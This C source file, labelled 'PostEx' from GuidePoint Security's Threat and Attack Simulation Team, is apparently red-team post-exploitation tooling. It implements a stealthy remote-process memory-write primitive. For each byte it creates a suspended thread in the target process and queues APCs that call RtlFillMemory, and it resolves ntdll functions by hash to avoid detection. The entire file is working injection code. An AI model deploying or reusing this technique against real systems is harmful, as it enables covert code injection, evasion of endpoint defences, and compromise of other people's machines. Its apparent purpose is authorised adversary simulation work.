/*!
 *
 * PostEx
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

#ifdef RtlFillMemory
#undef RtlFillMemory

VOID
NTAPI
RtlFillMemory(
	_In_ LPVOID Destination,
	_In_ SIZE_T Length,
	_In_ UCHAR Fill
);

#endif

typedef struct
{
	D_API( NtQueryInformationThread );
	D_API( NtWaitForSingleObject );
	D_API( RtlExitUserThread );
	D_API( NtCreateThreadEx );
	D_API( NtQueueApcThread );
	D_API( NtResumeThread );
	D_API( RtlFillMemory );
	D_API( NtClose );
} API ;

/* API Hashes */
#define H_API_NTQUERYINFORMATIONTHREAD	0xf5a0461b /* NtQueryInformationThread */
#define H_API_NTWAITFORSINGLEOBJECT	0xe8ac0c3c /* NtWaitForSingleObject */
#define H_API_RTLEXITUSERTHREAD		0x2f6db5e8 /* RtlExitUserThread */
#define H_API_NTCREATETHREADEX		0xaf18cfb0 /* NtCreateThreadEx */
#define H_API_NTQUEUEAPCTHREAD		0x0a6664b8 /* NtQueueApcThread */
#define H_API_NTRESUMETHREAD		0x5a4bc3d0 /* NtResumeThread */
#define H_API_RTLFILLMEMORY		0x89ab5f57 /* RtlFillMemory */
#define H_API_NTCLOSE			0x40d6e69d /* NtClose */

/* LIB Hashes */
#define H_LIB_NTDLL			0x1edab0ed /* ntdll.dll */

/*!
 *
 * Purpose:
 *
 * Creates a thread in the target process to write memory
 * using an APC queue to RtlFillMemory, overwriting the
 * target region. Does not verify if the write completed
 * successfully.
 *
 * Requires PROCESS_CREATE_THREAD access
 *
!*/
D_SEC( B ) VOID WriteRemoteMemory( _In_ HANDLE Process, _In_ PVOID Address, _In_ PVOID Buffer, _In_ SIZE_T Length )
{
	API				Api;
	THREAD_BASIC_INFORMATION	Tbi;

	BOOLEAN				Ret = TRUE;
	BOOLEAN				Cmp = FALSE;

	PUCHAR				Buf = C_PTR( Buffer );
	HANDLE				Thd = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Tbi, sizeof( Tbi ) );

	Api.NtQueryInformationThread = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTQUERYINFORMATIONTHREAD );
	Api.NtWaitForSingleObject    = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTWAITFORSINGLEOBJECT );
	Api.RtlExitUserThread        = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLEXITUSERTHREAD );
	Api.NtCreateThreadEx         = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCREATETHREADEX );
	Api.NtQueueApcThread         = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTQUEUEAPCTHREAD );
	Api.NtResumeThread           = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTRESUMETHREAD );
	Api.RtlFillMemory            = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLFILLMEMORY );
	Api.NtClose                  = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCLOSE );

	/* Write one byte at a time until complete */
	for ( SIZE_T Len = 0 ; Len < Length ; ++Len ) {
		/* Create a suspended thread at a routine to kill it */
		if ( NT_SUCCESS( Api.NtCreateThreadEx( &Thd, THREAD_ALL_ACCESS, NULL, Process, Api.RtlExitUserThread, STATUS_ACCESS_DENIED, TRUE, 0, 0x1000 * 4, 0x1000, NULL ) ) ) {
			/* Queue a call to fill the current address buffer with the specified byte */
			if ( NT_SUCCESS( Api.NtQueueApcThread( Thd, Api.RtlFillMemory, C_PTR( U_PTR( Address ) + Len ), C_PTR( U_PTR( 1 ) ), C_PTR( U_PTR( Buf[ Len ] ) ) ) ) ) {
				/* Queue a call to exit the current thread indicating we suceeded! */
				if ( NT_SUCCESS( Api.NtQueueApcThread( Thd, Api.RtlExitUserThread, C_PTR( U_PTR( STATUS_SUCCESS ) ), NULL, NULL ) ) ) {
					/* Resume the thread and trigger the APC's to be called! */
					if ( NT_SUCCESS( Api.NtResumeThread( Thd, NULL ) ) ) {
						/* Wait for the thread to complete! */
						if ( NT_SUCCESS( Api.NtWaitForSingleObject( Thd, FALSE, NULL ) ) ) {
							/* Query the information about the thread */
							if ( NT_SUCCESS( Api.NtQueryInformationThread( Thd, ThreadBasicInformation, &Tbi, sizeof( Tbi ), NULL ) ) ) {
								Cmp = NT_SUCCESS( Tbi.ExitStatus ) ? TRUE : FALSE;
							};
						};
					};
				};
			};
			/* Close! */
			Api.NtClose( Thd );
		};
		/* Did we fail? */
		if ( Cmp != TRUE ) {
			/* Abort! */
			break;
		};
	};

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Tbi, sizeof( Tbi ) );
};
